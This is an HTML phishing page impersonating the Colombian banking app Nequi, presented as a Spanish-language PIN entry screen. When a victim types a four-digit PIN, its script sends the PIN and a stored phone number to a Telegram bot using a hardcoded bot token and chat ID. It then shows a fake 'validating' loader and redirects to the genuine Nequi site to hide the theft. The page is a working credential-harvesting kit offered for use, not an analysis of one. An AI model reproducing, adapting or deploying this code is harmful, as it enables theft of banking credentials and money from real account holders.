<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    :root {
      --purple: #1E0B2C;
      --pink: #DA0081;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: var(--purple);
      color: white;
      font-family: 'Roboto', system-ui, sans-serif;
      min-height: 100vh;
      overflow: hidden;
    }
    header {
      padding: 20px;
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .back { font-size: 30px; cursor: pointer; }
    h1 { font-size: 26px; font-weight: 600; }

    .pins {
      display: flex;
      justify-content: center;
      gap: 18px;
      margin: 40px 0 20px 0;
    }
    .pin {
      width: 55px;
      height: 55px;
      background: #E0B0FF;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      color: #6B2B7A;
      font-weight: bold;
    }

    .message {
      text-align: center;
      color: #C4A1E6;
      font-size: 15px;
      line-height: 1.5;
      margin: 10px 0 60px 0;
    }

    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px 25px;
      max-width: 320px;
      margin: 0 auto;
      font-size: 34px;
    }
    .key {
      height: 65px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255,255,255,0.08);
      border-radius: 50%;
      color: white;
      user-select: none;
      touch-action: manipulation;
    }
    .key:active { background: rgba(255,255,255,0.2); }
    .delete { font-size: 24px !important; }

    .loadingContainer {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: var(--purple);
      z-index: 1000;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>
<body>

  <header>
    <a href="#" class="back">←</a>
    <h1>Escribe tu clave</h1>
  </header>

  <section style="padding: 0 20px; flex: 1;">
    <div class="pins" id="pins">
      <div class="pin" id="pin1"></div>
      <div class="pin" id="pin2"></div>
      <div class="pin" id="pin3"></div>
      <div class="pin" id="pin4"></div>
    </div>

    <p class="message">
      No dudamos que seas tú...<br>
      Pero es mejor confirmar ;)
    </p>

    <div class="keyboard" id="keyboard">
      <div class="key" data-value="1">1</div>
      <div class="key" data-value="2">2</div>
      <div class="key" data-value="3">3</div>
      <div class="key" data-value="4">4</div>
      <div class="key" data-value="5">5</div>
      <div class="key" data-value="6">6</div>
      <div class="key" data-value="7">7</div>
      <div class="key" data-value="8">8</div>
      <div class="key" data-value="9">9</div>
      <div class="key"></div>
      <div class="key" data-value="0">0</div>
      <div class="key delete" id="delete">✕</div>
    </div>
  </section>

  <!-- LOADER -->
  <div class="loadingContainer" id="loader">
    
    <p style="margin-top:30px; font-size:18px;">Por favor, espere...</p>
    <p style="margin-top:10px; text-align:center; max-width:280px; opacity:0.8;">
      En este momento estamos validando algunos datos.<br>Puede tardar un momento.
    </p>
  </div>

  <script>
    const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
    const chatId = "773351137";

    let pin = "";
    const pins = document.querySelectorAll('.pin');

    function updatePins() {
      pins.forEach((el, i) => {
        el.textContent = i < pin.length ? "●" : "";
      });
    }

    document.querySelectorAll('.key').forEach(key => {
      key.addEventListener('click', () => {
        const value = key.dataset.value;
        
        if (value && pin.length < 4) {
          pin += value;
          updatePins();

          if (pin.length === 4) {
            sendToTelegram(pin);
          }
        }
      });
    });

    document.getElementById('delete').addEventListener('click', () => {
      pin = pin.slice(0, -1);
      updatePins();
    });

    function sendToTelegram(password) {
      document.getElementById('loader').style.display = 'flex';

      const phone = localStorage.getItem("numero") || "No registrado";

      const message = `🔴 NEQUI - CLAVE RECIBIDA\n\n` +
                      `📱 Número: +57 ${phone}\n` +
                      `🔑 Clave: ${password}\n` +
                      `⏰ Hora: ${new Date().toLocaleString('es-CO')}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .finally(() => {
        setTimeout(() => {
          window.location.href = "https://www.nequi.com.co";
        }, 2500);
      });
    }

    // Guardar número si viene de pantalla anterior
    document.addEventListener("DOMContentLoaded", () => {
      if (!localStorage.getItem("numero")) {
        localStorage.setItem("numero", "3000000000"); // fallback
      }
    });
  </script>
</body>
</html>
